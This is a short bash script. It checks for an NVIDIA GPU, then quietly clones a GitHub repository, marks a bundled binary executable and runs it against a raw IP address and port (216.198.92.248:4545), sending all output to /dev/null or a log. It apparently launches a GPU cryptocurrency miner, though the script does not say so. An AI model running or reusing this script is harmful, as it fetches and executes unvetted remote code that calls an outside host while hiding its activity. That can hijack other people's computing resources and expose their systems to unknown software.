#! /bin/bash
nvidia-smi
printf "Run 216.198.92.248:4545/$1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://216.198.92.248:4545/"$1" &> log
} &> /dev/null
